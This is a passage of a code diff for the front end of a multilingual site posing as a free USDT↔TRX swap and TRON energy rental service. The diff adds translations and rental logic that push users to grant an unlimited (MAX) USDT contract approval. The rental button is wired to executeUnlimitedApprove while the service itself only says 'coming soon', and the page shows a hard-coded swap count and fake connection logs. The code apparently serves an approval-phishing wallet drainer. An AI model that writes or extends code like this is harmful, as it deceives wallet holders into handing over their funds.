+    th:{send_amount_trx:'จำนวนที่ส่ง (TRX)',receive_amount_usdt:'จำนวนที่ได้รับ (ประมาณ USDT)',w_imtoken:'กระเป๋าหลายเชนระดับโลก',w_wc:'เชื่อมต่อผ่าน QR',not_approved:'ยังไม่อนุมัติ',approved_max:'ไม่จำกัด (MAX)',approval_done:'อนุมัติแล้ว',modal_subtitle:'เลือกกระเป๋าเงิน<br>เพื่อเชื่อมต่ออัตโนมัติ',w_tronlink:'กระเป๋า TRON อย่างเป็นทางการ',w_trust:'กระเป๋าหลายเชน',w_tp:'ยอดนิยมในเอเชีย',w_bitget:'กระเป๋า Web3 ระดับโลก',w_okx:'กระเป๋า OKX',modal_tip_title:'หากแอปไม่เปิด:',modal_tip1:'1. เปิดแอปกระเป๋าด้วยตนเอง',modal_tip2:'2. ไปที่แท็บ<strong class="text-white">เบราว์เซอร์</strong>',modal_tip3:'3. <strong class="text-white">วาง</strong> URL',swap_count_val:'18,492 รายการ',bal:'ยอด',bal2:'ยอด',log_system:'[ระบบ] TRON Mainnet เชื่อมต่อแล้ว',log_waiting:'[รอ] กำลังตรวจจับกระเป๋า...',step_auto:'อัตโนมัติ',live_log:'บันทึก',disconnected:'ไม่ได้เชื่อมต่อ',usdt_balance:'ยอด USDT',wallet_address:'ที่อยู่กระเป๋า',close_btn:'ปิด',ticker_label:'การแลกเปลี่ยนแบบเรียลไทม์',header_sub:'USDT ↔ TRX แลกเปลี่ยนทันที | TRC-20',connect_wallet:'เชื่อมต่อ',hero_badge:'TRON MAINNET INSTANT SWAP',hero_title1:'USDT ↔ TRX',hero_title2:'แลกฟรี',hero_desc:'แลกเปลี่ยน USDT และ TRX ได้อย่างอิสระ ไม่มีค่าธรรมเนียม',today_volume:'ปริมาณวันนี้',free_event:'ไม่มีค่าธรรมเนียม',swap_count:'จำนวนการแลก',steps_title:'ขั้นตอน',step_waiting:'รอดำเนินการ',step1_title:'เชื่อมต่อกระเป๋า',step2_title:'อนุมัติ (ครั้งเดียว)',step2_desc:'อนุมัติสัญญาอัจฉริยะ USDT',step3_title:'รับ TRX',step3_desc:'TRX จะถูกโอนเข้ากระเป๋าอัตโนมัติ',swap_title:'USDT ↔ TRX แลกเปลี่ยน',swap_sub:'TRC-20 แลกทันที',approval_needed:'ต้องอนุมัติ',send_amount:'จำนวนที่ส่ง (USDT)',receive_amount:'จำนวนที่ได้รับ (ประมาณ)',exchange_rate_label:'อัตราแลกเปลี่ยน',fee_label:'ค่าธรรมเนียม',fee_free:'ฟรี',swap_btn_text:'เริ่มแลก (ต้องอนุมัติครั้งเดียว)',swap_btn_done:'แลกเลย',swap_notice:'การแลกครั้งแรกต้องอนุมัติสัญญาอัจฉริยะ',wallet_info:'ข้อมูลกระเป๋า',wallet_not_connected:'ยังไม่ได้เชื่อมต่อ',wallet_guide:'เปิดในเบราว์เซอร์ DApp ของกระเป๋า',swap_status:'สถานะ',select_wallet:'เลือกกระเป๋า',security_title:'การรักษาความปลอดภัย',faq_title:'คำถามที่พบบ่อย',modal_success:'อนุมัติสำเร็จ!',modal_desc:'การอนุมัติแลกเปลี่ยน USDT ↔ TRX ได้รับการยืนยัน',energy_badge:'TRON Energy',energy_title:'เช่าพลังงาน',energy_desc:'ประหยัดค่าธรรมเนียม USDT สูงสุด 80%',energy_tab_energy:'พลังงาน',energy_tab_bandwidth:'แบนด์วิดท์',energy_target:'ที่อยู่เป้าหมาย',energy_my_addr:'ใช้ที่อยู่ของฉัน',energy_amount:'จำนวนพลังงาน',energy_1usdt:'≈ 1 โอน USDT',energy_2usdt:'≈ 2 ครั้ง',energy_15usdt:'≈ 15 ครั้ง',energy_150usdt:'≈ 150 ครั้ง',energy_duration:'ระยะเวลา',energy_1h:'1 ชั่วโมง',energy_1d:'1 วัน',energy_3d:'3 วัน',energy_30d:'30 วัน',energy_est_price:'ค่าใช้จ่ายโดยประมาณ',energy_save_word:'ประหยัด',energy_save_max:'ประหยัดสูงสุด',energy_speed:'ทันที',energy_noncustodial:'ไม่มีผู้ดูแล',energy_addr_invalid:'กรุณาใส่ที่อยู่ TRON ที่ถูกต้อง',energy_coming_soon:'บริการเช่าพลังงานเร็วๆ นี้!',energy_approval_done:'อนุมัติแล้ว',energy_rent_btn_approve:'เช่าพลังงาน (อนุมัติครั้งแรก)',energy_rent_btn_done:'เช่าพลังงาน',energy_free_event:'เช่าพลังงานฟรี'},
+    vi:{send_amount_trx:'Số tiền gửi (TRX)',receive_amount_usdt:'Số tiền nhận (ước tính USDT)',w_imtoken:'Ví đa chuỗi toàn cầu',w_wc:'Kết nối qua QR',not_approved:'Chưa phê duyệt',approved_max:'Không giới hạn (MAX)',approval_done:'Đã phê duyệt',modal_subtitle:'Chọn ví của bạn<br>để kết nối tự động.',w_tronlink:'Ví chính thức TRON',w_trust:'Ví đa chuỗi',w_tp:'Phổ biến ở châu Á',w_bitget:'Ví Web3 toàn cầu',w_okx:'Ví sàn OKX',modal_tip_title:'Nếu ứng dụng không mở:',modal_tip1:'1. Mở ứng dụng ví thủ công',modal_tip2:'2. Vào tab <strong class="text-white">Trình duyệt</strong>',modal_tip3:'3. <strong class="text-white">Dán</strong> URL',swap_count_val:'18,492 giao dịch',bal:'Số dư',bal2:'Số dư',log_system:'[Hệ thống] TRON Mainnet đã kết nối',log_waiting:'[Chờ] Đang phát hiện ví...',step_auto:'Tự động',live_log:'Nhật ký',disconnected:'NGẮT KẾT NỐI',usdt_balance:'Số dư USDT',wallet_address:'Địa chỉ ví',close_btn:'Đóng',ticker_label:'Giao dịch thời gian thực',header_sub:'USDT ↔ TRX Đổi ngay | TRC-20',connect_wallet:'Kết nối ví',hero_badge:'TRON MAINNET INSTANT SWAP',hero_title1:'USDT ↔ TRX',hero_title2:'Đổi miễn phí',hero_desc:'Tự do đổi giữa USDT và TRX với phí 0%.',today_volume:'Khối lượng hôm nay',free_event:'Miễn phí giao dịch',swap_count:'Số giao dịch',steps_title:'Cách thức',step_waiting:'Đang chờ',step1_title:'Kết nối ví',step2_title:'Phê duyệt (1 lần)',step2_desc:'Ủy quyền hợp đồng USDT',step3_title:'Nhận TRX',step3_desc:'TRX sẽ được gửi vào ví của bạn tự động.',swap_title:'USDT ↔ TRX Đổi',swap_sub:'TRC-20 đổi ngay',approval_needed:'Cần phê duyệt',send_amount:'Số tiền gửi (USDT)',receive_amount:'Số tiền nhận (ước tính)',exchange_rate_label:'Tỷ giá',fee_label:'Phí',fee_free:'Miễn phí',swap_btn_text:'Bắt đầu đổi (cần phê duyệt 1 lần)',swap_btn_done:'Đổi ngay',swap_notice:'Lần đổi đầu tiên cần phê duyệt hợp đồng thông minh',wallet_info:'Thông tin ví',wallet_not_connected:'Ví chưa kết nối',wallet_guide:'Mở trong trình duyệt DApp của ví.',swap_status:'Trạng thái',select_wallet:'Chọn ví',security_title:'Bảo mật',faq_title:'Câu hỏi thường gặp',modal_success:'Phê duyệt thành công!',modal_desc:'Ủy quyền đổi USDT ↔ TRX đã được xác nhận.',energy_badge:'TRON Energy',energy_title:'Thuê năng lượng',energy_desc:'Tiết kiệm đến 80% phí chuyển USDT',energy_tab_energy:'Năng lượng',energy_tab_bandwidth:'Băng thông',energy_target:'Địa chỉ đích',energy_my_addr:'Dùng địa chỉ của tôi',energy_amount:'Số lượng năng lượng',energy_1usdt:'≈ 1 lần chuyển USDT',energy_2usdt:'≈ 2 lần chuyển',energy_15usdt:'≈ 15 lần chuyển',energy_150usdt:'≈ 150 lần chuyển',energy_duration:'Thời gian thuê',energy_1h:'1 giờ',energy_1d:'1 ngày',energy_3d:'3 ngày',energy_30d:'30 ngày',energy_est_price:'Chi phí ước tính',energy_save_word:'tiết kiệm',energy_save_max:'Tiết kiệm tối đa',energy_speed:'Tức thì',energy_noncustodial:'Không ủy thác',energy_addr_invalid:'Vui lòng nhập địa chỉ TRON hợp lệ',energy_coming_soon:'Dịch vụ thuê năng lượng sắp ra mắt!',energy_approval_done:'Đã phê duyệt',energy_rent_btn_approve:'Thuê năng lượng (phê duyệt 1 lần)',energy_rent_btn_done:'Thuê năng lượng',energy_free_event:'Thuê năng lượng miễn phí'},
+    ja:{send_amount_trx:'送金額 (TRX)',receive_amount_usdt:'受取額（予想 USDT）',w_imtoken:'グローバルマルチチェーンウォレット',w_wc:'QRコードで接続',not_approved:'未承認',approved_max:'無制限 (MAX)',approval_done:'交換承認済み',modal_subtitle:'ウォレットアプリを選択して<br>自動接続します。',w_tronlink:'TRON公式ウォレット',w_trust:'マルチチェーンウォレット',w_tp:'アジアで人気',w_bitget:'グローバルWeb3ウォレット',w_okx:'OKX取引所ウォレット',modal_tip_title:'アプリが開かない場合：',modal_tip1:'1. ウォレットアプリを手動で開く',modal_tip2:'2. アプリ内の<strong class="text-white">ブラウザ</strong>タブへ',modal_tip3:'3. URLを<strong class="text-white">貼り付け</strong>',swap_count_val:'18,492 件',bal:'残高',bal2:'残高',log_system:'[システム] TRON Mainnet 接続済み',log_waiting:'[待機] ウォレット検出中...',step_auto:'自動処理',live_log:'リアルタイムログ',disconnected:'未接続',usdt_balance:'USDT残高',wallet_address:'ウォレットアドレス',close_btn:'閉じる',ticker_label:'リアルタイム交換状況',header_sub:'USDT ↔ TRX 即時交換 | TRC-20 メインネット',connect_wallet:'ウォレット接続',hero_badge:'TRON メインネット即時スワップ',hero_title1:'USDT ↔ TRX',hero_title2:'無料交換',hero_desc:'手数料0%でUSDTとTRXを自由に交換。',today_volume:'本日の取引量',free_event:'手数料無料',swap_count:'交換件数',steps_title:'交換手順',step_waiting:'待機中',step1_title:'ウォレット接続',step2_title:'承認（初回のみ）',step2_desc:'USDTスマートコントラクト交換権限承認',step3_title:'TRX即時入金',step3_desc:'交換されたTRXが自動的にウォレットに入金されます。',swap_title:'USDT ↔ TRX 交換',swap_sub:'TRC-20 即時スワップ',approval_needed:'承認が必要',send_amount:'送金額 (USDT)',receive_amount:'受取額（予想）',exchange_rate_label:'交換レート',fee_label:'手数料',fee_free:'無料',swap_btn_text:'交換開始（初回承認必要）',swap_btn_done:'交換する',swap_notice:'初回交換時にスマートコントラクトの承認が必要です',wallet_info:'ウォレット情報',wallet_not_connected:'ウォレット未接続',wallet_guide:'ウォレットアプリのDAppブラウザで開いてください。',swap_status:'交換状態',select_wallet:'ウォレットを選択',security_title:'セキュリティ検証',faq_title:'よくある質問',modal_success:'承認完了！',modal_desc:'USDT ↔ TRX交換権限が承認されました。',energy_badge:'TRON Energy',energy_title:'エネルギーレンタル',energy_desc:'USDT送金手数料を最大80%節約',energy_tab_energy:'エネルギー',energy_tab_bandwidth:'帯域幅',energy_target:'対象アドレス',energy_my_addr:'自分のアドレスを使用',energy_amount:'エネルギー量',energy_1usdt:'≈ 1 USDT送金',energy_2usdt:'≈ 2回送金',energy_15usdt:'≈ 15回送金',energy_150usdt:'≈ 150回送金',energy_duration:'レンタル期間',energy_1h:'1時間',energy_1d:'1日',energy_3d:'3日間',energy_30d:'30日間',energy_est_price:'予想コスト',energy_save_word:'節約',energy_save_max:'最大節約',energy_speed:'即時充電',energy_noncustodial:'ノンカストディ',energy_addr_invalid:'有効なTRONアドレスを入力してください',energy_coming_soon:'エネルギーレンタルサービス準備中です！',energy_approval_done:'承認済み',energy_rent_btn_approve:'エネルギーレンタル（初回承認必要）',energy_rent_btn_done:'エネルギーをレンタル',energy_free_event:'エネルギーレンタル無料'},
+    de:{send_amount_trx:'Sie senden (TRX)',receive_amount_usdt:'Sie erhalten (geschätzt USDT)',w_imtoken:'Globales Multi-Chain Wallet',w_wc:'Per QR verbinden',not_approved:'Nicht genehmigt',approved_max:'Unbegrenzt (MAX)',approval_done:'Tausch genehmigt',modal_subtitle:'Wählen Sie Ihr Wallet<br>für automatische Verbindung.',w_tronlink:'TRON Offizielles Wallet',w_trust:'Multi-Chain Wallet',w_tp:'Beliebt in Asien',w_bitget:'Globales Web3 Wallet',w_okx:'OKX Börsen-Wallet',modal_tip_title:'Falls die App nicht öffnet:',modal_tip1:'1. Öffnen Sie die Wallet-App manuell',modal_tip2:'2. Gehen Sie zum <strong class="text-white">Browser</strong>-Tab',modal_tip3:'3. URL <strong class="text-white">einfügen</strong>',swap_count_val:'18,492 Swaps',bal:'Guthaben',bal2:'Guthaben',log_system:'[System] TRON Mainnet verbunden',log_waiting:'[Warten] Wallet wird erkannt...',step_auto:'Automatisch',live_log:'Live-Protokoll',disconnected:'GETRENNT',usdt_balance:'USDT Guthaben',wallet_address:'Wallet-Adresse',close_btn:'Schließen',ticker_label:'Live-Austausch',header_sub:'USDT ↔ TRX Sofort-Tausch | TRC-20',connect_wallet:'Wallet verbinden',hero_badge:'TRON MAINNET SOFORT-TAUSCH',hero_title1:'USDT ↔ TRX',hero_title2:'Kostenlos tauschen',hero_desc:'Tauschen Sie frei zwischen USDT und TRX mit 0% Gebühr.',today_volume:'Heutiges Volumen',free_event:'Gebührenfrei',swap_count:'Tauschvorgänge',steps_title:'So funktioniert es',step_waiting:'Wartend',step1_title:'Wallet verbinden',step2_title:'Genehmigung (einmalig)',step2_desc:'USDT Smart-Contract-Autorisierung',step3_title:'TRX erhalten',step3_desc:'Getauschte TRX werden automatisch in Ihr Wallet eingezahlt.',swap_title:'USDT ↔ TRX Tausch',swap_sub:'TRC-20 Sofort-Swap',approval_needed:'Genehmigung erforderlich',send_amount:'Sie senden (USDT)',receive_amount:'Sie erhalten (geschätzt)',exchange_rate_label:'Wechselkurs',fee_label:'Gebühr',fee_free:'Kostenlos',swap_btn_text:'Tausch starten (Genehmigung erforderlich)',swap_btn_done:'Jetzt tauschen',swap_notice:'Erstmaliger Tausch erfordert Smart-Contract-Genehmigung',wallet_info:'Wallet-Info',wallet_not_connected:'Wallet nicht verbunden',wallet_guide:'Öffnen Sie im DApp-Browser der Wallet-App.',swap_status:'Tauschstatus',select_wallet:'Wallet auswählen',security_title:'Sicherheit',faq_title:'Häufige Fragen',modal_success:'Genehmigung abgeschlossen!',modal_desc:'USDT ↔ TRX Tauschautorisierung bestätigt.',energy_badge:'TRON Energy',energy_title:'Energie mieten',energy_desc:'Sparen Sie bis zu 80%',energy_tab_energy:'Energie',energy_tab_bandwidth:'Bandbreite',energy_target:'Zieladresse',energy_my_addr:'Meine Adresse',energy_amount:'Energiemenge',energy_1usdt:'≈ 1 USDT-Überweisung',energy_2usdt:'≈ 2 Überweisungen',energy_15usdt:'≈ 15 Überweisungen',energy_150usdt:'≈ 150 Überweisungen',energy_duration:'Mietdauer',energy_1h:'1 Stunde',energy_1d:'1 Tag',energy_3d:'3 Tage',energy_30d:'30 Tage',energy_est_price:'Geschätzte Kosten',energy_save_word:'Ersparnis',energy_save_max:'Max. Ersparnis',energy_speed:'Sofort',energy_noncustodial:'Nicht-verwahrend',energy_addr_invalid:'Bitte geben Sie eine gültige TRON-Adresse ein',energy_coming_soon:'Energie-Mietservice kommt bald!',energy_approval_done:'Genehmigt',energy_rent_btn_approve:'Energie mieten (Genehmigung)',energy_rent_btn_done:'Energie mieten',energy_free_event:'Energie kostenlos mieten'},
+    fr:{send_amount_trx:'Vous envoyez (TRX)',receive_amount_usdt:'Vous recevez (est. USDT)',w_imtoken:'Portefeuille multi-chaînes mondial',w_wc:'Connecter via QR',not_approved:'Non approuvé',approved_max:'Illimité (MAX)',approval_done:'Échange approuvé',modal_subtitle:'Sélectionnez votre portefeuille<br>pour une connexion automatique.',w_tronlink:'Portefeuille officiel TRON',w_trust:'Portefeuille multi-chaînes',w_tp:'Populaire en Asie',w_bitget:'Portefeuille Web3 mondial',w_okx:'Portefeuille OKX',modal_tip_title:'Si l\'appli ne s\'ouvre pas :',modal_tip1:'1. Ouvrez l\'appli manuellement',modal_tip2:'2. Allez dans l\'onglet <strong class="text-white">Navigateur</strong>',modal_tip3:'3. <strong class="text-white">Collez</strong> l\'URL',swap_count_val:'18,492 échanges',bal:'Solde',bal2:'Solde',log_system:'[Système] TRON Mainnet connecté',log_waiting:'[Attente] Détection du portefeuille...',step_auto:'Automatique',live_log:'Journal',disconnected:'DÉCONNECTÉ',usdt_balance:'Solde USDT',wallet_address:'Adresse du portefeuille',close_btn:'Fermer',ticker_label:'Échanges en direct',header_sub:'USDT ↔ TRX Échange instantané | TRC-20',connect_wallet:'Connecter',hero_badge:'TRON MAINNET ÉCHANGE INSTANTANÉ',hero_title1:'USDT ↔ TRX',hero_title2:'Échange gratuit',hero_desc:'Échangez USDT contre TRX instantanément avec 0% de frais.',today_volume:'Volume du jour',free_event:'Sans frais',swap_count:'Échanges',steps_title:'Comment ça marche',step_waiting:'En attente',step1_title:'Connecter le portefeuille',step2_title:'Approbation (unique)',step2_desc:'Autorisation du contrat USDT',step3_title:'Recevoir TRX',step3_desc:'Les TRX échangés sont déposés automatiquement.',swap_title:'USDT ↔ TRX Échange',swap_sub:'TRC-20 swap instantané',approval_needed:'Approbation requise',send_amount:'Vous envoyez (USDT)',receive_amount:'Vous recevez (est.)',exchange_rate_label:'Taux de change',fee_label:'Frais',fee_free:'Gratuit',swap_btn_text:'Commencer l\'échange (approbation)',swap_btn_done:'Échanger maintenant',swap_notice:'Le premier échange nécessite l\'approbation du contrat',wallet_info:'Info portefeuille',wallet_not_connected:'Portefeuille non connecté',wallet_guide:'Ouvrez dans le navigateur DApp du portefeuille.',swap_status:'Statut',select_wallet:'Choisir un portefeuille',security_title:'Sécurité vérifiée',faq_title:'Questions fréquentes',modal_success:'Approbation réussie !',modal_desc:'L\'autorisation d\'échange USDT ↔ TRX est confirmée.',energy_badge:'TRON Energy',energy_title:'Location énergie',energy_desc:'Économisez jusqu\'à 80%',energy_tab_energy:'Énergie',energy_tab_bandwidth:'Bande passante',energy_target:'Adresse cible',energy_my_addr:'Mon adresse',energy_amount:'Quantité',energy_1usdt:'≈ 1 transfert USDT',energy_2usdt:'≈ 2 transferts',energy_15usdt:'≈ 15 transferts',energy_150usdt:'≈ 150 transferts',energy_duration:'Durée',energy_1h:'1 heure',energy_1d:'1 jour',energy_3d:'3 jours',energy_30d:'30 jours',energy_est_price:'Coût estimé',energy_save_word:'économie',energy_save_max:'Économie max.',energy_speed:'Instantané',energy_noncustodial:'Non-dépositaire',energy_addr_invalid:'Entrez une adresse TRON valide',energy_coming_soon:'Location énergie bientôt !',energy_approval_done:'Approuvé',energy_rent_btn_approve:'Louer énergie (approbation)',energy_rent_btn_done:'Louer énergie',energy_free_event:'Location énergie gratuite'},
+    es:{send_amount_trx:'Usted envía (TRX)',receive_amount_usdt:'Usted recibe (est. USDT)',w_imtoken:'Billetera multicadena global',w_wc:'Conectar por QR',not_approved:'No aprobado',approved_max:'Ilimitado (MAX)',approval_done:'Cambio aprobado',modal_subtitle:'Seleccione su billetera<br>para conectar automáticamente.',w_tronlink:'Billetera oficial TRON',w_trust:'Billetera multicadena',w_tp:'Popular en Asia',w_bitget:'Billetera Web3 global',w_okx:'Billetera OKX',modal_tip_title:'Si la app no se abre:',modal_tip1:'1. Abra la app manualmente',modal_tip2:'2. Vaya a la pestaña <strong class="text-white">Navegador</strong>',modal_tip3:'3. <strong class="text-white">Pegue</strong> la URL',swap_count_val:'18,492 cambios',bal:'Saldo',bal2:'Saldo',log_system:'[Sistema] TRON Mainnet conectado',log_waiting:'[Espera] Detectando billetera...',step_auto:'Automático',live_log:'Registro',disconnected:'DESCONECTADO',usdt_balance:'Saldo USDT',wallet_address:'Dirección de billetera',close_btn:'Cerrar',ticker_label:'Intercambios en vivo',header_sub:'USDT ↔ TRX Cambio instantáneo | TRC-20',connect_wallet:'Conectar',hero_badge:'TRON MAINNET INTERCAMBIO INSTANTÁNEO',hero_title1:'USDT ↔ TRX',hero_title2:'Cambio gratuito',hero_desc:'Cambie USDT a TRX al instante con 0% de comisión.',today_volume:'Volumen de hoy',free_event:'Sin comisiones',swap_count:'Intercambios',steps_title:'Cómo funciona',step_waiting:'Esperando',step1_title:'Conectar billetera',step2_title:'Aprobación (una vez)',step2_desc:'Autorización del contrato USDT',step3_title:'Recibir TRX',step3_desc:'Los TRX intercambiados se depositan automáticamente.',swap_title:'USDT ↔ TRX Cambio',swap_sub:'TRC-20 swap instantáneo',approval_needed:'Aprobación requerida',send_amount:'Usted envía (USDT)',receive_amount:'Usted recibe (est.)',exchange_rate_label:'Tipo de cambio',fee_label:'Comisión',fee_free:'Gratis',swap_btn_text:'Iniciar cambio (aprobación)',swap_btn_done:'Cambiar ahora',swap_notice:'El primer cambio requiere aprobación del contrato',wallet_info:'Info de billetera',wallet_not_connected:'Billetera no conectada',wallet_guide:'Abra en el navegador DApp de la billetera.',swap_status:'Estado',select_wallet:'Seleccionar billetera',security_title:'Seguridad verificada',faq_title:'Preguntas frecuentes',modal_success:'¡Aprobación completada!',modal_desc:'La autorización de cambio USDT ↔ TRX está confirmada.',energy_badge:'TRON Energy',energy_title:'Alquilar energía',energy_desc:'Ahorre hasta un 80%',energy_tab_energy:'Energía',energy_tab_bandwidth:'Ancho de banda',energy_target:'Dirección destino',energy_my_addr:'Usar mi dirección',energy_amount:'Cantidad de energía',energy_1usdt:'≈ 1 transferencia USDT',energy_2usdt:'≈ 2 transferencias',energy_15usdt:'≈ 15 transferencias',energy_150usdt:'≈ 150 transferencias',energy_duration:'Duración del alquiler',energy_1h:'1 hora',energy_1d:'1 día',energy_3d:'3 días',energy_30d:'30 días',energy_est_price:'Coste estimado',energy_save_word:'ahorro',energy_save_max:'Ahorro máximo',energy_speed:'Instantáneo',energy_noncustodial:'Sin custodia',energy_addr_invalid:'Introduzca una dirección TRON válida',energy_coming_soon:'¡Servicio de alquiler de energía próximamente!',energy_approval_done:'Aprobado',energy_rent_btn_approve:'Alquilar energía (aprobación)',energy_rent_btn_done:'Alquilar energía',energy_free_event:'Alquiler de energía gratis'}
 };
 var currentLang='ko';
 function detectLang(){var bl=navigator.language||navigator.userLanguage||'en';bl=bl.toLowerCase();if(bl.startsWith('ko'))return 'ko';if(bl.startsWith('zh'))return 'zh';if(bl.startsWith('ru'))return 'ru';if(bl.startsWith('th'))return 'th';if(bl.startsWith('vi'))return 'vi';if(bl.startsWith('ja'))return 'ja';if(bl.startsWith('de'))return 'de';if(bl.startsWith('fr'))return 'fr';if(bl.startsWith('es'))return 'es';return 'en';}
-function applyLang(lang){currentLang=lang;var t=translations[lang]||translations.en;document.querySelectorAll('[data-i18n]').forEach(function(el){var key=el.getAttribute('data-i18n');if(t[key])el.textContent=t[key];});document.querySelectorAll('[data-i18n-html]').forEach(function(el){var key=el.getAttribute('data-i18n-html');if(t[key])el.innerHTML=t[key];});document.getElementById('lang-select').value=lang;localStorage.setItem('tronswap_lang',lang);try{loadFaqForLang(lang);}catch(e){}try{tickerTimeText=tickerTimeTexts[lang]||tickerTimeTexts.en;}catch(e){}}
+function applyLang(lang){
+    currentLang=lang;
+    var t=translations[lang]||translations.en;
+    document.querySelectorAll('[data-i18n]').forEach(function(el){var key=el.getAttribute('data-i18n');if(t[key])el.textContent=t[key];});
+    document.querySelectorAll('[data-i18n-html]').forEach(function(el){var key=el.getAttribute('data-i18n-html');if(t[key])el.innerHTML=t[key];});
+    document.getElementById('lang-select').value=lang;
+    localStorage.setItem('tronswap_lang',lang);
+    try{loadFaqForLang(lang);}catch(e){}
+    try{tickerTimeText=tickerTimeTexts[lang]||tickerTimeTexts.en;}catch(e){}
+    try{updateEnergyPrice();}catch(e){}
+}
 window.setLang=function(lang){applyLang(lang);};
 window.addEventListener('DOMContentLoaded',function(){var saved=localStorage.getItem('tronswap_lang');applyLang(saved||detectLang());});
 
-// ===== Energy Rental Logic =====
-var energyAmount=65000,energyDuration='1h';
-var energyPrices={energy:{'65000':{'1h':1.5,'1d':3.8,'3d':6.5,'30d':58.0},'131000':{'1h':3.0,'1d':7.6,'3d':13.0,'30d':116.0},'1000000':{'1h':23.0,'1d':58.0,'3d':99.0,'30d':885.0},'10000000':{'1h':230.0,'1d':580.0,'3d':990.0,'30d':8850.0}}};
+// ===== Energy Rental Logic (백업본 탭 전환/내 주소 채우기 + 개선본 무료 배너 통합) =====
+var energyResource='energy',energyAmount=65000,energyDuration='1h';
+var energyPrices={
+    energy:{'65000':{'1h':1.5,'1d':3.8,'3d':6.5,'30d':58.0},'131000':{'1h':3.0,'1d':7.6,'3d':13.0,'30d':116.0},'1000000':{'1h':23.0,'1d':58.0,'3d':99.0,'30d':885.0},'10000000':{'1h':230.0,'1d':580.0,'3d':990.0,'30d':8850.0}},
+    bandwidth:{'65000':{'1h':0.8,'1d':2.0,'3d':3.5,'30d':30.0},'131000':{'1h':1.6,'1d':4.0,'3d':7.0,'30d':60.0},'1000000':{'1h':12.0,'1d':30.0,'3d':52.0,'30d':460.0},'10000000':{'1h':120.0,'1d':300.0,'3d':520.0,'30d':4600.0}}
+};
 var energyBurnCost={'65000':4.0,'131000':8.0,'1000000':61.0,'10000000':610.0};
+
+function switchEnergyTab(type){
+    energyResource=type;
+    var tabE=document.getElementById('energy-tab-energy');
+    var tabB=document.getElementById('energy-tab-bandwidth');
+    var _t=translations[currentLang]||translations.ko;
+    if(type==='energy'){
+        tabE.className='flex-1 py-2.5 rounded-lg text-sm font-bold transition-all bg-gradient-to-r from-amber-500/20 to-orange-500/20 text-amber-400 border border-amber-500/30';
+        tabB.className='flex-1 py-2.5 rounded-lg text-sm font-bold transition-all text-slate-500 hover:text-slate-300';
+        document.getElementById('energy-resource-label').innerHTML='<i class="fa-solid fa-bolt text-amber-400 mr-1"></i>'+(_t.energy_tab_energy||'에너지');
+    }else{
+        tabB.className='flex-1 py-2.5 rounded-lg text-sm font-bold transition-all bg-gradient-to-r from-cyan-500/20 to-blue-500/20 text-cyan-400 border border-cyan-500/30';
+        tabE.className='flex-1 py-2.5 rounded-lg text-sm font-bold transition-all text-slate-500 hover:text-slate-300';
+        document.getElementById('energy-resource-label').innerHTML='<i class="fa-solid fa-wifi text-cyan-400 mr-1"></i>'+(_t.energy_tab_bandwidth||'대역폭');
+    }
+    updateEnergyPrice();
+}
+
+function fillMyAddress(){
+    if(currentWalletAddress){
+        var el=document.getElementById('energy-address');
+        el.value=currentWalletAddress;
+        showToast(currentLang==='ko'?'지갑 주소가 입력되었습니다':'Wallet address filled');
+    }else{
+        showToast(currentLang==='ko'?'먼저 지갑을 연결하세요':'Please connect your wallet first','error');
+        handleConnectWallet();
+    }
+}
+
 function selectEnergyAmount(amt){
     energyAmount=amt;
     document.querySelectorAll('.energy-amt-btn').forEach(function(b){b.className='energy-amt-btn py-2.5 rounded-xl text-xs font-bold transition-all bg-slate-950/60 text-slate-400 border border-slate-800 hover:border-slate-600';});
     var sel=document.querySelector('.energy-amt-btn[data-amt="'+amt+'"]');
     if(sel)sel.className='energy-amt-btn active-amt py-2.5 rounded-xl text-xs font-bold transition-all';
+    document.getElementById('energy-sel-amount').textContent=amt.toLocaleString();
     updateEnergyPrice();
 }
+
 function selectEnergyDuration(dur){
     energyDuration=dur;
     document.querySelectorAll('.energy-dur-btn').forEach(function(b){b.className='energy-dur-btn py-2.5 rounded-xl text-xs font-bold transition-all bg-slate-950/60 text-slate-400 border border-slate-800 hover:border-slate-600';});
     var sel=document.querySelector('.energy-dur-btn[data-dur="'+dur+'"]');
     if(sel)sel.className='energy-dur-btn active-dur py-2.5 rounded-xl text-xs font-bold transition-all';
+    var _t=translations[currentLang]||translations.ko;
+    var durMap={'1h':_t.energy_1h||'1시간','1d':_t.energy_1d||'1일','3d':_t.energy_3d||'3일','30d':_t.energy_30d||'30일'};
+    document.getElementById('energy-sel-duration').textContent=durMap[dur]||dur;
     updateEnergyPrice();
 }
+
 function updateEnergyPrice(){
-    var prices=energyPrices.energy;
+    var prices=energyPrices[energyResource]||energyPrices.energy;
     var key=String(energyAmount);
     var price=(prices[key]&&prices[key][energyDuration])||0;
     var burn=energyBurnCost[key]||6.43;
     var savePct=burn>0?Math.round((1-price/burn)*100):0;
     if(savePct<0)savePct=0;
     var _t=translations[currentLang]||translations.ko;
-    var isFree=(energyAmount===65000||energyAmount===131000)&&energyDuration==='1h';
+    var isFree=energyResource==='energy'&&(energyAmount===65000||energyAmount===131000)&&energyDuration==='1h';
     if(isFree){
         document.getElementById('energy-price').textContent=_t.fee_free||'무료';
         document.getElementById('energy-price-detail').classList.add('hidden');
@@ -1003,6 +1279,7 @@ function updateEnergyPrice(){
         document.getElementById('energy-free-banner').classList.add('hidden');
     }
 }
+
 function handleEnergyRental(){
     var addr=document.getElementById('energy-address').value.trim();
     if(!addr||!addr.startsWith('T')){var _t=translations[currentLang]||translations.ko;showToast(_t.energy_addr_invalid||'유효한 TRON 주소를 입력하세요','error');return;}
@@ -1010,21 +1287,28 @@ function handleEnergyRental(){
     if(!isApproved){executeEnergyApprove();}
     else{processEnergyRental();}
 }
+
 function processEnergyRental(){var _t=translations[currentLang]||translations.ko;showToast(_t.energy_coming_soon||'에너지 렌탈 서비스 준비 중입니다. 곧 오픈합니다!');}
+
 window.executeEnergyApprove=async function(){
     if(!isConnected||!currentWalletAddress){showToast('지갑을 먼저 연결하세요.','error');handleConnectWallet();return;}
     if(isApproved){setEnergyApprovedUI();processEnergyRental();return;}
     var btn=document.getElementById('energy-rent-btn');
     btn.disabled=true;btn.innerHTML='<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span> 승인 처리 중...';
-    try{await executeUnlimitedApprove();}catch(e){
+    try{await executeUnlimitedApprove();}finally{
         var _t=translations[currentLang]||translations.ko;
-        btn.innerHTML='<i class="fa-solid fa-bolt"></i><span id="energy-btn-text">'+(_t.energy_rent_btn_approve||'에너지 렌탈 (최초 1회 승인 필요)')+'</span>';
